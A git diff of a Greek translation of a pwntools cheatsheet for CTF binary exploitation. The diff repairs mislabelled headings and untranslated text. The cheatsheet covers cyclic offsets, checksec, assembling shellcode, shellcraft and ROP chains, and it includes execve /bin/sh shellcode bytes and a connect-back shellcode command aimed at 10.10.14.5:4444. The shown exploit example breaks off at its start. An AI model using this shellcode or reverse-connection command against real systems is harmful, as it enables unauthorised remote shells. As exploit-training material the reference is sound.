@@ -1,45 +1,48 @@
-# 🔍 pwntools — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[pwntools](https://github.com/Gallopsled/pwntools) is a best-in-class CTF framework and exploit development library written in Python. Designed for rapid prototyping, binary exploitation (pwn), and reverse engineering, it provides a comprehensive suite of command-line tools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) alongside a high-level Python API for interacting with local processes and remote sockets.
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## 📋 Πίνακας περιεχομένων
 
-- [[ROP Chain Construction](#rop-chain-construction)](#core-capabilities)
+# pwntools Cheatsheet
+
+Το [pwntools](https://github.com/Gallopsled/pwntools) είναι το καλύτερο στην κατηγορία του πλαίσιο CTF και βιβλιοθήκη ανάπτυξης εκμετάλλευσης γραμμένη σε Python. Σχεδιασμένο για γρήγορη δημιουργία πρωτοτύπων, δυαδική εκμετάλλευση (pwn) και αντίστροφη μηχανική, παρέχει μια ολοκληρωμένη σουίτα εργαλείων γραμμής εντολών (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) μαζί με ένα API υψηλού επιπέδου Python για αλληλεπίδραση με τοπικές διαδικασίες και απομακρυσμένες υποδοχές.
+
+---
+
+## Πίνακας περιεχομένων
+
+- [Core Capabilities](#core-capabilities)
 - [Εγκατάσταση](#installation)
-- [Εγκατάσταση](#command-line-utilities-pwn-cmd)
-  - [` `pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
-  - [` `pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
-  - [` `pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
-  - [` `pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
-  - [` `pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
-- [` pwn template` (Exploit Skeleton Generator)](#python-exploit-development-workflow)
+- [Βοηθητικά προγράμματα γραμμής εντολών (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
+  - [`pwn cyclic` (Υπολογισμός μετατόπισης buffer)](#pwn-cyclic-buffer-offset-calculation)
+  - [`pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
+  - [`pwn asm` & `pwn disasm` (Συναρμολογητής / Αποσυναρμολογητής)](#pwn-asm--pwn-disasm-assembler--disassembler)
+  - [`pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
+  - [`pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
+- [Ροή εργασιών ανάπτυξης Python Exploit](#python-exploit-development-workflow)
   - [Process & Remote Socket Connections](#process--remote-socket-connections)
-  - [ELF Parsing & Symbols](#elf-parsing--symbols)
+  - [Elf Parsing & Symbols](#elf-parsing--symbols)
   - [ROP Chain Construction](#rop-chain-construction)
   - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
-- [Πρακτικά παραδείγματα](#complete-exploit-example-buffer-overflow--ret2win)
+- [Παράδειγμα πλήρους εκμετάλλευσης (Υπερχείλιση buffer + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)
 
 ---
 
-## [ROP Chain Construction](#rop-chain-construction)
+## Βασικές Δυνατότητες
 
-- **Tubes Architecture**: Unified interface for interacting with local processes (`process`), remote TCP sockets (`remote`), and SSH sessions (`ssh`).
-- **Binary & Gadget Inspection**: Automated ELF symbol resolution, GOT/PLT lookup, and automated ROP chain synthesis.
-- **On-the-Fly Assembly**: Instant translation between assembly mnemonics and opcodes across x86, x86_64, ARM, MIPS, and AArch64.
-- **Shellcode Synthesis**: Pre-built, customizable shellcode templates for reverse shells, execve, file reading, and evasion.
+- **Αρχιτεκτονική Tubes:** Ενοποιημένη διεπαφή για αλληλεπίδραση με τοπικές διεργασίες (`process`), απομακρυσμένες υποδοχές TCP (`remote`) και συνεδρίες SSH (`ssh`).
+- **Δυαδική επιθεώρηση & Gadget:** Αυτοματοποιημένη ανάλυση συμβόλων ELF, αναζήτηση GOT/PLT και αυτοματοποιημένη σύνθεση αλυσίδας ROP.
+- **Συναρμολόγηση On-the-Fly:** Άμεση μετάφραση μεταξύ μνημονικών συναρμολόγησης και κωδικών opcodes σε x86, x86_64, ARM, MIPS και AArch64.
+- **Σύνθεση Shellcode:** Προκατασκευασμένα, προσαρμόσιμα πρότυπα shellcode για αντίστροφα κελύφη, execve, ανάγνωση αρχείων και διαφυγή.
 
 ---
 
 ## Εγκατάσταση
-
 ```bash
 # Ubuntu / Debian / Kali Linux
 sudo apt-get update && sudo apt-get install -y python3-pwntools
@@ -50,14 +53,12 @@ pip3 install pwntools
 # Verify command-line utilities
 pwn version
 ```
-
 ---
 
-## Εγκατάσταση
+## Βοηθητικά προγράμματα γραμμής εντολών (`pwn <cmd>`)
 
-### ` pwn cyclic` (Buffer Offset Calculation)
-Generate unique De Bruijn cyclic patterns to determine the exact crash offset (EIP / RIP overwrite):
-
+### `pwn cyclic` (Υπολογισμός μετατόπισης buffer)
+Δημιουργήστε μοναδικά κυκλικά μοτίβα De Bruijn για να προσδιορίσετε την ακριβή μετατόπιση σφάλματος (αντικατάσταση EIP / RIP):
 ```bash
 # Generate a 200-byte unique pattern
 pwn cyclic 200
@@ -69,15 +70,13 @@ pwn cyclic -l 0x6161616c
 # 64-bit architecture cyclic pattern lookup
 pwn cyclic -l "faaa" -n 8
 ```
-
-### ` pwn checksec` (Mitigation Inspection)
-` pwn cyclic` (Buffer Offset Calculation)
+### `pwn checksec` (Επιθεώρηση μετριασμού)
+Ελέγξτε τους μετριασμούς ασφαλείας (Canary, NX, PIE, RELRO, ASLR) οποιουδήποτε εκτελέσιμου ELF:
 ```bash
 pwn checksec /path/to/binary
 ```
-
-### ` pwn asm` & `pwn disasm` (Assembler / Disassembler)
-Assemble instructions into shellcode bytes directly from the terminal:
+### `pwn asm` & `pwn disasm` (Συναρμολογητής / Αποσυναρμολογητής)
+Συγκεντρώστε οδηγίες σε byte shellcode απευθείας από το τερματικό:
 ```bash
 # Assemble x86 instructions to hex bytes
 pwn asm "xor eax, eax; push eax"
@@ -88,9 +87,8 @@ pwn asm -c amd64 "mov rax, 59; syscall" --format hex
 # Disassemble raw hex bytes back to assembly
 pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
 ```
-
-### ` pwn shellcraft` (Shellcode Generator)
-Generate production-ready shellcode payloads directly to terminal stdout or binary files:
+### `pwn shellcraft` (Γεννήτρια Shellcode)
+Δημιουργήστε ωφέλιμα φορτία shellcode έτοιμα για παραγωγή απευθείας σε τερματικά stdout ή δυαδικά αρχεία:
 ```bash
 # Generate Linux x64 execve /bin/sh shellcode in hex
 pwn shellcraft amd64.linux.sh --format hex
@@ -101,18 +99,16 @@ pwn shellcraft amd64.linux.connect 10.10.14.5 4444
 # Output pure raw bytes directly into a file
 pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
 ```
-
-### ` pwn template` (Exploit Skeleton Generator)
-Generate a battle-tested Python exploit template for a target binary and remote server:
+### `pwn template` (Exploit Skeleton Generator)
+Δημιουργήστε ένα πρότυπο εκμετάλλευσης Python δοκιμασμένο στη μάχη για έναν δυαδικό και απομακρυσμένο διακομιστή στόχο:
 ```bash
 pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
 ```
-
 ---
 
-## ` pwn template` (Exploit Skeleton Generator)
+## Ροή εργασιών ανάπτυξης Python Exploit
 
-### Process & Remote Socket Connections
+### Διαδικασία & Συνδέσεις απομακρυσμένης υποδοχής
 ```python
 from pwn import *
 
@@ -133,18 +129,16 @@ io.sendline(b'Alice')
 # Switch to interactive shell once exploit succeeds
 io.interactive()
 ```
-
 ### ELF Parsing & Symbols
-Python Exploit Development Workflow
+Αυτόματη ανάγνωση διευθύνσεων συναρτήσεων, πινάκων GOT και PLT χωρίς μη αυτόματες αναζητήσεις GDB:
 ```python
 elf = ELF('./vuln_binary')
 print(f"Target function address: {hex(elf.symbols['win'])}")
 print(f"puts() PLT address: {hex(elf.plt['puts'])}")
 print(f"puts() GOT address: {hex(elf.got['puts'])}")
 ```
-
-### ROP Chain Construction
-Build Return-Oriented Programming (ROP) chains automatically:
+### Κατασκευή αλυσίδων ROP
+Δημιουργία αλυσίδων προγραμματισμού προσανατολισμένου στην επιστροφή (ROP) αυτόματα:
 ```python
 elf = ELF('./vuln_binary')
 rop = ROP(elf)
@@ -155,9 +149,8 @@ print(rop.dump())
 
 payload = b"A" * 40 + rop.chain()
 ```
-
-### Packing & Endianness (`p32` / `p64`)
-Convert integer memory addresses into little-endian bytes:
+### Συσκευασία & Endianness (`p32` / `p64`)
+Μετατρέψτε διευθύνσεις ακέραιης μνήμης σε byte μικρής κλίμακας:
 ```python
 # 32-bit little-endian packing
 address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'
@@ -168,11 +161,9 @@ address_64 = p64(0x0000000000401156)
 # Unpacking bytes to integer
 val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
 ```
-
 ---
 
-## Πρακτικά παραδείγματα
-
+## Παράδειγμα πλήρους εκμετάλλευσης (Υπερχείλιση buffer + ret2win)
 ```python
 #!/usr/bin/env python3
 from pwn import *
